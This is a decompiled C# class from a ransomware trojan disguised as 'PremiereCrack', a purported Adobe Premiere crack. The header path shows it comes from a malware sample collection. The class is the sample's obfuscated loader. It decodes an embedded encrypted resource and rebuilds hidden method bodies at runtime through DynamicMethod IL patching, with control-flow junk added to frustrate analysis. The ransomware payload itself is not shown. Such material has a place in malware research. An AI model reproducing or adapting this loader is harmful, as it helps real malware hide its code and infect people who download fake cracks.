// Decompiled with JetBrains decompiler
// Type: A.M
// Assembly: PremiereCrack, Version=2.3.77.2, Culture=neutral, PublicKeyToken=null
// MVID: B728F238-A35B-46BB-92FD-55CC50CC96B9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.Win32.Generic-27a1f89ce5a37815010c8411dddec85d5d66e81a957ad722fbd2dc64f99651c8.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Text;

namespace A
{
  internal class M
  {
    internal static readonly byte[] T;
    internal static readonly Dictionary<int, int> T;
    private static readonly ModuleHandle T;

    static M()
    {
      if (M.T == null)
      {
label_1:
        switch (2)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (M.\u002Ecctor);
            }
            byte[] numArray = Convert.FromBase64String("UHJlbWllcmVDcmFjayo=");
            string name = Encoding.UTF8.GetString(numArray, 0, (int) BE.T(numArray));
            M.T = W.T(97L, Assembly.GetExecutingAssembly().GetManifestResourceStream(name));
            M.T = new Dictionary<int, int>();
            BinaryReader binaryReader = new BinaryReader((Stream) new MemoryStream(M.T, false));
            try
            {
              int num1 = binaryReader.ReadInt32();
              for (int index = 0; index < num1; ++index)
              {
                int key = binaryReader.ReadInt32();
                int num2 = binaryReader.ReadInt32();
                M.T[key] = num2;
              }
label_8:
              switch (2)
              {
                case 0:
                  goto label_8;
              }
            }
            finally
            {
              if (binaryReader != null)
              {
label_11:
                switch (6)
                {
                  case 0:
                    goto label_11;
                  default:
                    binaryReader.Dispose();
                    break;
                }
              }
            }
            break;
        }
      }
      if ((object) Type.GetTypeFromHandle(GH.T()) == null)
        return;
label_15:
      switch (1)
      {
        case 0:
          goto label_15;
        default:
          M.T = Assembly.GetExecutingAssembly().GetModules()[0].ModuleHandle;
          break;
      }
    }

    internal static void T(int T, int E, int H)
    {
      Type typeFromHandle;
      MethodBase methodBase;
      try
      {
        typeFromHandle = Type.GetTypeFromHandle(M.T.ResolveTypeHandle(T));
        methodBase = XH.T((object) MethodBase.GetMethodFromHandle(M.T.ResolveMethodHandle(E), M.T.ResolveTypeHandle(H)));
      }
      catch (Exception ex)
      {
        throw;
      }
      FieldInfo[] fields = typeFromHandle.GetFields(BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.GetField);
      for (int index = 0; index < (int) AH.T(fields); ++index)
      {
        FieldInfo fieldInfo = fields[index];
        try
        {
          DynamicMethod t = SH.T;
          MethodBody methodBody = methodBase.GetMethodBody();
          Type[] typeArray = M.T(methodBase);
          string name = FE.T(methodBase.DeclaringType.FullName, ".", methodBase.Name, "_Encrypted$");
          Type returnType;
          if ((object) KH.T((object) methodBase) == null)
          {
label_5:
            switch (5)
            {
              case 0:
                goto label_5;
              default:
                if (false)
                {
                  // ISSUE: method reference
                  RuntimeMethodHandle runtimeMethodHandle = __methodref (M.T);
                }
                returnType = WH.T((object) methodBase).ReturnType;
                break;
            }
          }
          else
            returnType = (Type) null;
          Type[] parameterTypes = typeArray;
          Type declaringType = methodBase.DeclaringType;
          DynamicMethod dynamicMethod = new DynamicMethod(name, returnType, parameterTypes, declaringType, true);
          int T1;
          M.T.TryGetValue(T, out T1);
          DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
          M.T(methodBody, dynamicIlInfo);
          M.T(ref T1, methodBase, dynamicIlInfo);
          M.T(ref T1, dynamicIlInfo);
          Delegate @delegate = dynamicMethod.CreateDelegate(typeFromHandle);
          fieldInfo.SetValue((object) null, (object) @delegate);
        }
        catch (Exception ex)
        {
        }
      }
label_14:
      switch (1)
      {
        case 0:
          goto label_14;
      }
    }

    private static void T(ref int T, MethodBase E, DynamicILInfo H)
    {
      int int32_1 = BitConverter.ToInt32(M.T, T);
      T += 4;
      int int32_2 = BitConverter.ToInt32(M.T, T);
      T += 4;
      byte[] numArray = WE.T(int32_2);
      Buffer.BlockCopy((Array) M.T, T, (Array) numArray, 0, int32_2);
      new M.B(E, numArray, H).T();
      H.SetCode(numArray, int32_1);
      T += int32_2;
    }

    private static void T(MethodBody T, DynamicILInfo E)
    {
      SignatureHelper localVarSigHelper = SignatureHelper.GetLocalVarSigHelper();
      IEnumerator<LocalVariableInfo> enumerator = T.LocalVariables.GetEnumerator();
      try
      {
        while (enumerator.MoveNext())
        {
          LocalVariableInfo current = enumerator.Current;
          localVarSigHelper.AddArgument(current.LocalType, current.IsPinned);
        }
label_4:
        switch (3)
        {
          case 0:
            goto label_4;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (M.T);
              break;
            }
            break;
        }
      }
      finally
      {
        if (enumerator != null)
        {
label_8:
          switch (4)
          {
            case 0:
              goto label_8;
            default:
              enumerator.Dispose();
              break;
          }
        }
      }
      E.SetLocalSignature(localVarSigHelper.GetSignature());
    }

    private static void T(ref int T, DynamicILInfo E)
    {
      int int32_1 = BitConverter.ToInt32(M.T, T);
      T += 4;
      if (int32_1 == 0)
      {
label_1:
        switch (7)
        {
          case 0:
            goto label_1;
          default:
            if (true)
              break;
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (M.T);
            break;
        }
      }
      else
      {
        byte[] numArray = WE.T(int32_1);
        Buffer.BlockCopy((Array) M.T, T, (Array) numArray, 0, int32_1);
        int startIndex = 4;
        int num1 = (int32_1 - 4) / 24;
        for (int index = 0; index < num1; ++index)
        {
          ExceptionHandlingClauseOptions int32_2 = (ExceptionHandlingClauseOptions) BitConverter.ToInt32(numArray, startIndex);
          int num2 = startIndex + 20;
          switch (int32_2)
          {
            case ExceptionHandlingClauseOptions.Clause:
              RuntimeTypeHandle type = M.T.ResolveTypeHandle(BitConverter.ToInt32(numArray, num2));
              M.T(E.GetTokenFor(type), num2, numArray);
              break;
            case ExceptionHandlingClauseOptions.Fault:
              throw new NotSupportedException("dynamic method does not support fault clause");
          }
          startIndex = num2 + 4;
        }
label_11:
        switch (5)
        {
          case 0:
            goto label_11;
          default:
            E.SetExceptions(numArray);
            break;
        }
      }
    }

    public static void T(int T, int E, byte[] H)
    {
      H[E++] = (byte) T;
      H[E++] = (byte) (T >> 8);
      H[E++] = (byte) (T >> 16);
      H[E++] = (byte) (T >> 24);
    }

    private static Type[] T(MethodBase T)
    {
      ParameterInfo[] parameters = T.GetParameters();
      int T1 = (int) DH.T(parameters);
      if (!T.IsStatic)
      {
label_1:
        switch (4)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (M.T);
            }
            ++T1;
            break;
        }
      }
      Type[] typeArray = ZH.T(T1);
      int index1 = 0;
      if (!T.IsStatic)
      {
label_6:
        switch (7)
        {
          case 0:
            goto label_6;
          default:
            if (T.DeclaringType.IsValueType)
            {
label_8:
              switch (2)
              {
                case 0:
                  goto label_8;
                default:
                  typeArray[0] = T.DeclaringType.MakeByRefType();
                  break;
              }
            }
            else
              typeArray[0] = T.DeclaringType;
            ++index1;
            break;
        }
      }
      int index2 = 0;
      while (index2 < (int) DH.T(parameters))
      {
        typeArray[index1] = parameters[index2].ParameterType;
        ++index2;
        ++index1;
      }
label_15:
      switch (7)
      {
        case 0:
          goto label_15;
        default:
          return typeArray;
      }
    }

    public sealed class B
    {
      private static OpCode[] T = QH.T(256);
      private static OpCode[] E = QH.T(256);
      private int T;
      private byte[] T;
      private DynamicILInfo T;
      private Module T;
      private Type[] T;
      private Type[] E;

      static B()
      {
        FieldInfo[] fields = Type.GetTypeFromHandle(VH.T()).GetFields(BindingFlags.Static | BindingFlags.Public);
        for (int index1 = 0; index1 < (int) AH.T(fields); ++index1)
        {
          OpCode opCode = FH.T(fields[index1].GetValue(V.T));
          ushort index2 = (ushort) opCode.Value;
          if (index2 < (ushort) 256)
          {
label_2:
            switch (7)
            {
              case 0:
                goto label_2;
              default:
                if (false)
                {
                  // ISSUE: method reference
                  RuntimeMethodHandle runtimeMethodHandle = __methodref (M.B.\u002Ecctor);
                }
                M.B.T[(int) index2] = opCode;
                continue;
            }
          }
          else if (((int) index2 & 65280) == 65024)
          {
label_7:
            switch (7)
            {
              case 0:
                goto label_7;
              default:
                M.B.E[(int) index2 & (int) byte.MaxValue] = opCode;
                continue;
            }
          }
        }
label_11:
        switch (4)
        {
          case 0:
            goto label_11;
        }
      }

      public B(MethodBase T, byte[] E, DynamicILInfo H)
      {
        this.T = H;
        this.T = E;
        this.T = 0;
        this.T = T.Module;
        Type[] typeArray1;
        if ((object) KH.T((object) T) == null)
        {
label_1:
          switch (1)
          {
            case 0:
              goto label_1;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (M.B.\u002Ector);
              }
              typeArray1 = T.GetGenericArguments();
              break;
          }
        }
        else
          typeArray1 = JH.T;
        this.T = typeArray1;
        Type[] typeArray2;
        if ((object) T.DeclaringType != null)
        {
label_7:
          switch (1)
          {
            case 0:
              goto label_7;
            default:
              typeArray2 = T.DeclaringType.GetGenericArguments();
              break;
          }
        }
        else
          typeArray2 = JH.T;
        this.E = typeArray2;
      }

      internal void T()
      {
        while (this.T < (int) BE.T(this.T))
          this.T();
label_3:
        switch (5)
        {
          case 0:
            goto label_3;
          default:
            if (true)
              break;
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (M.B.T);
            break;
        }
      }

      private object T()
      {
        int t = this.T;
        OpCode nop = OpCodes.Nop;
        byte index1 = this.T();
        OpCode opCode;
        if (index1 != (byte) 254)
        {
label_1:
          switch (1)
          {
            case 0:
              goto label_1;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (M.B.T);
              }
              opCode = M.B.T[(int) index1];
              break;
          }
        }
        else
        {
          byte index2 = this.T();
          opCode = M.B.E[(int) index2];
        }
        switch (opCode.OperandType)
        {
          case OperandType.InlineBrTarget:
            this.T(4);
            return (object) null;
          case OperandType.InlineField:
            this.E(this.T.GetTokenFor(this.T.ResolveField(this.T(), this.E, this.T).FieldHandle), t + opCode.Size);
            return (object) null;
          case OperandType.InlineI:
            this.T(4);
            return (object) null;
          case OperandType.InlineI8:
            this.T(8);
            return (object) null;
          case OperandType.InlineMethod:
            MethodBase methodBase1 = this.T.ResolveMethod(this.T(), this.E, this.T);
            this.E(this.T.GetTokenFor(methodBase1.MethodHandle, methodBase1.DeclaringType.TypeHandle), t + opCode.Size);
            return (object) null;
          case OperandType.InlineNone:
            return (object) null;
          case OperandType.InlineR:
            this.T(8);
            return (object) null;
          case OperandType.InlineSig:
            this.E(this.T.GetTokenFor(this.T.ResolveSignature(this.T())), t + opCode.Size);
            return (object) null;
          case OperandType.InlineString:
            this.E(this.T.GetTokenFor(this.T.ResolveString(this.T())), t + opCode.Size);
            return (object) null;
          case OperandType.InlineSwitch:
            this.T(this.T() * 4);
            return (object) null;
          case OperandType.InlineTok:
            int num = this.T();
            MemberInfo T = this.T.ResolveMember(num, this.E, this.T);
            if (T.MemberType != MemberTypes.TypeInfo)
            {
label_23:
              switch (1)
              {
                case 0:
                  goto label_23;
                default:
                  if (T.MemberType == MemberTypes.NestedType)
                  {
label_25:
                    switch (4)
                    {
                      case 0:
                        goto label_25;
                    }
                  }
                  else
                  {
                    if (T.MemberType != MemberTypes.Method)
                    {
label_28:
                      switch (3)
                      {
                        case 0:
                          goto label_28;
                        default:
                          if (T.MemberType == MemberTypes.Constructor)
                          {
label_30:
                            switch (1)
                            {
                              case 0:
                                goto label_30;
                            }
                          }
                          else if (T.MemberType == MemberTypes.Field)
                          {
label_33:
                            switch (3)
                            {
                              case 0:
                                goto label_33;
                              default:
                                num = this.T.GetTokenFor(MH.T((object) T).FieldHandle);
                                goto label_35;
                            }
                          }
                          else
                            goto label_35;
                          break;
                      }
                    }
                    MethodBase methodBase2 = BH.T((object) T);
                    num = this.T.GetTokenFor(methodBase2.MethodHandle, methodBase2.DeclaringType.TypeHandle);
                    goto label_35;
                  }
                  break;
              }
            }
            num = this.T.GetTokenFor(PH.T((object) T).TypeHandle);
label_35:
            this.E(num, t + opCode.Size);
            return (object) null;
          case OperandType.InlineType:
            this.E(this.T.GetTokenFor(this.T.ResolveType(this.T(), this.E, this.T).TypeHandle), t + opCode.Size);
            return (object) null;
          case OperandType.InlineVar:
            this.T(2);
            return (object) null;
          case OperandType.ShortInlineBrTarget:
            this.T(1);
            return (object) null;
          case OperandType.ShortInlineI:
            this.T(1);
            return (object) null;
          case OperandType.ShortInlineR:
            this.T(4);
            return (object) null;
          case OperandType.ShortInlineVar:
            this.T(1);
            return (object) null;
          default:
            throw new BadImageFormatException(IH.T((object) "unexpected OperandType ", (object) opCode.OperandType));
        }
      }

      private void T(int T) => this.T += T;

      private byte T() => this.T[this.T++];

      private int T()
      {
        int t = this.T;
        this.T += 4;
        return BitConverter.ToInt32(this.T, t);
      }

      private void E(int T, int E)
      {
        this.T[E++] = (byte) T;
        this.T[E++] = (byte) (T >> 8);
        this.T[E++] = (byte) (T >> 16);
        this.T[E++] = (byte) (T >> 24);
      }
    }
  }
}
